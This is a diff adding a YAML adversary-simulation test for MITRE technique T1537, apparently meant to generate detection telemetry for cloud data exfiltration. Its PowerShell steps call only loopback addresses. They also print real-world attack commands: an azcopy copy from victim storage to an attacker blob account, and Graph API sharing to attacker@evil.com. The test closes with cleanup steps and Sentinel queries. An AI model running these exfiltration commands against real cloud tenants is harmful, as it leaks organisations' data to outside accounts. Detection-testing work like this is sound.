@@ -1,0 +1,119 @@
+id: T1537_transfer_data_to_cloud_account
+name: "Transfer Data to Cloud Account"
+mitre_technique: "T1537"
+mitre_tactic: "exfiltration"
+description: >
+  Adversaries transfer data between cloud accounts — from the victim's cloud tenant
+  to an adversary-controlled cloud account on the same service. In Azure, this can
+  be done via azcopy with SAS tokens, storage account access keys, or cross-tenant
+  sharing of storage. In M365, adversaries may share SharePoint sites or OneDrive
+  folders with an external account. This technique abuses legitimate cloud sharing
+  features, making the transfer look like normal collaboration rather than exfiltration.
+  Detection relies on cross-tenant transfer monitoring and anomalous external sharing.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1537/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1537 — Transfer Data to Cloud Account simulation (loopback only)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate cross-tenant Azure Blob copy — azcopy pattern"
+    command: |
+      $payload = "$env:TEMP\PAS_T1537_exfil_data.zip"
+      Set-Content $payload "PAS-T1537-CROSS-TENANT-EXFIL-$(Get-Date -Format o)"
+
+      Write-Host "[PAS] Cross-tenant storage copy simulation:"
+      Write-Host "[PAS] Real: azcopy copy 'https://victim.blob.core.windows.net/data/*?<SAS>' 'https://attacker.blob.core.windows.net/exfil/?<SAS>'"
+
+      $azcopy = Get-Command azcopy -ErrorAction SilentlyContinue
+      if ($azcopy) {
+          $proc = Start-Process azcopy.exe `
+              -ArgumentList "copy $payload 'https://127.0.0.1/exfil-container/data.zip?PAS_DEST_SAS'" `
+              -PassThru -NoNewWindow -ErrorAction SilentlyContinue
+          Start-Sleep -Milliseconds 500
+          if ($proc -and -not $proc.HasExited) {
+              $proc | Stop-Process -Force -ErrorAction SilentlyContinue
+          }
+          Write-Host "[PAS] azcopy cross-tenant copy process event generated"
+      }
+
+      Write-Host "[PAS] Azure Storage REST API cross-copy (loopback):"
+      try {
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/exfil-container/data.zip")
+          $req.Method = "PUT"
+          $req.Headers.Add("x-ms-blob-type","BlockBlob")
+          $req.Headers.Add("x-ms-copy-source","https://victim.blob.core.windows.net/data/archive.zip")
+          $req.ContentType = "application/octet-stream"
+          $req.ContentLength = 0
+          $req.Timeout = 300
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] x-ms-copy-source header pattern generated — server-side copy"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate M365 cross-tenant share — OneDrive/SharePoint external sharing"
+    command: |
+      Write-Host "[PAS] M365 cross-tenant sharing patterns:"
+      Write-Host "[PAS] Real attack vectors:"
+      Write-Host "  1. SharePoint: Set-SPOSite -SharingCapability ExternalUserAndGuestSharing"
+      Write-Host "     Then share sensitive document library with attacker@external.com"
+      Write-Host "  2. OneDrive: Share file with 'Anyone with link' -> attacker downloads"
+      Write-Host "  3. Teams: Create a channel and invite external guest (attacker@evil.com)"
+      Write-Host ""
+      Write-Host "[PAS] Graph API simulation (loopback):"
+      try {
+          $req = [System.Net.WebRequest]::Create(
+              "http://127.0.0.1/v1.0/drives/{driveId}/items/{itemId}/invite")
+          $req.Method = "POST"
+          $req.ContentType = "application/json"
+          $req.Headers.Add("Authorization","Bearer PAS_TOKEN")
+          $req.Timeout = 300
+          $body = [Text.Encoding]::UTF8.GetBytes(
+              "{`"roles`":[`"read`"],`"recipients`":[{`"email`":`"attacker@evil.com`"}]}")
+          $req.ContentLength = $body.Length
+          $s = $req.GetRequestStream(); $s.Write($body,0,$body.Length); $s.Close()
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] OneDrive sharing invite to external address — Graph API telemetry generated"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check Azure Activity Log — cross-tenant azcopy transfers, M365 audit: SharingInvitationCreated to external domain"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove cross-tenant exfil payload"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1537_exfil_data.zip" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Cross-tenant exfil payload removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1537 cleanup complete"
+
+analyst_checklist:
+  - "Azure Activity Log: azcopy with cross-tenant destination (different storage account domain)"
+  - "Azure Activity Log: x-ms-copy-source header pointing to victim storage on PUT operation"
+  - "M365 audit: SharingInvitationCreated to external domain for sensitive document library"
+  - "Sentinel: AzureActivity | where OperationNameValue == 'Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write' and Properties contains 'x-ms-copy-source'"
+  - "Sentinel: OfficeActivity | where Operation == 'SharingInvitationCreated' and TargetUserOrGroupType == 'Guest'"
+  - "MDE alert: 'Cross-tenant data transfer detected'"
+  - "CONTROL CHECK: Azure Storage — disable cross-tenant replication unless required; restrict SAS tokens to source tenant"
+  - "CONTROL CHECK: SharePoint/OneDrive external sharing — restrict to approved domains only; block sharing with non-corporate accounts"
+  - "CONTROL CHECK: Defender for Cloud Apps — 'Mass file download and share' policy for OneDrive/SharePoint"
